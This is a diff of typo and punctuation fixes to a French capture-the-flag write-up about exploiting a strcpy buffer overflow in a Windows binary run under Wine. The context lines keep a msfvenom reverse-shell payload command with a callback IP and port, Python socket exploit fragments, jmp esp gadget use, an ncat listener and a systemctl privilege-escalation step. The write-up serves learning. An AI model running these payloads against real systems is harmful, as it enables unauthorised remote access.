@@ -91,7 +91,7 @@ On voit ainsi plusieurs comparaisons à des valeurs harcodées : 0x2d, 0x2e, 0x4
 
 Il s'agit de caractères qui ne devront pas être inclus dans notre payload sans quoi il sera cassé.
 
-La fonction `_f3` est quand à elle simple et il ne fait aucun doute qu'elle est vulnérable avec son appel à `strcpy` :
+La fonction `_f3` est quant à elle simple et il ne fait aucun doute qu'elle est vulnérable avec son appel à `strcpy` :
 
 ```nasm
 _f3 (char *arg_8h);
@@ -172,13 +172,13 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Ici j'ai mis un breakpoint sur l'instruction ret dans *_f3* puisque c'est là où le détournement de l'exécution aura lieu.
 
-Il nous faut un shellcode et comme il y a différents caractères interdits autant s'en remettre à Metasploit qui utilisera des endodeurs pour obtenir un shellcode valide :
+Il nous faut un shellcode et comme il y a différents caractères interdits autant s'en remettre à Metasploit qui utilisera des encodeurs pour obtenir un shellcode valide :
 
 ```bash
 msfvenom -a x86 -b '\x2d\x2e\x46\x47\x59\x5e\x60\x00' -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 --format python
 ```
 
-Il faut aussi choisir par quoi on écraser l'adresse de retour. A l'aide de [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) je trouve facilement une instruction dans le binaire qui fait un `call eax`. Il faut donc passer notre shellcode en début de payload :
+Il faut aussi choisir par quoi on va écraser l'adresse de retour. A l'aide de [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) je trouve facilement une instruction dans le binaire qui fait un `call eax`. Il faut donc passer notre shellcode en début de payload :
 
 ```python
 import socket
@@ -225,7 +225,7 @@ sock.send(buffer + b"\r\n")
 sock.close()
 ```
 
-Et là c'est la douche froide :
+Et là, c'est la douche froide :
 
 ```
 Unhandled exception: page fault on write access to 0xb80185f6 in 32-bit code (0x0135f563).
@@ -246,11 +246,11 @@ Backtrace:
 0x0135f563: addb	%ah,0x35(%ecx,%edi,8)
 ```
 
-On voit que le code tente d'écrire à `[ecx+edi*8]+0x35` (il me semble car ce n'est pas la notation que j'utilise habituellement :p) qui correspond à une zone mémoire non mappée.
+On voit que le code tente d'écrire à `[ecx+edi*8]+0x35` (il me semble, car ce n'est pas la notation que j'utilise habituellement :p) qui correspond à une zone mémoire non mappée.
 
 Quel est le problème ? Potentiellement le shellcode place des données sur la stack et en le faisant se modifie lui-même ce qui provoque l'exécution de code cassé.
 
-J'ai utilisé différents shellcodes et au final il y avait toujours un problème.
+J'ai utilisé différents shellcodes et finalement il y avait toujours un problème.
 
 J'ai finalement placé le shellcode après l'adresse de retour avec l'utilisation d'un `jmp esp` comme gadget (présent dans la DLL) :
 
@@ -265,9 +265,9 @@ sock.send(buffer + b"\r\n")
 sock.close()
 ```
 
-On place quelques NOPs histoire d'être sûr que notre shellcode est bien callé en mémoire.
+On place quelques NOPs afin d'être sûr que notre shellcode est bien calé en mémoire.
 
-Après un test local on peut appliquer sur la VM. On obtient bien notre reverse shell :
+Après un test local, on peut appliquer sur la VM. On obtient bien notre reverse shell :
 
 ```bash
 $ ncat -l -p 4444 -v
@@ -321,7 +321,7 @@ gsettings set org.gnome.desktop.session idle-delay 1
 /usr/bin/wine login.exe
 ```
 
-ainsi que le flag `75894c2b3d5c3b78372af63694cdc659`.
+Ainsi que le flag `75894c2b3d5c3b78372af63694cdc659`.
 
 L'utilisateur peut utiliser `systemctl` avec les droits root, ce sera notre porte de sortie finale :
 
@@ -365,4 +365,4 @@ while true
 f632f5eaffa5607c961e22ba40291ab7
 ```
 
-J'ai bien galéré avec ces histoires de shellcode. Il aurait peut être été possible de faire fonctionner la première technique et faisant d'abord exécuter des gadgets pour décaler la stack (sub esp + ret).
+J'ai bien galéré avec ces histoires de shellcode. Il aurait peut-être été possible de faire fonctionner la première technique et faisant d'abord exécuter des gadgets pour décaler la stack (sub esp + ret).
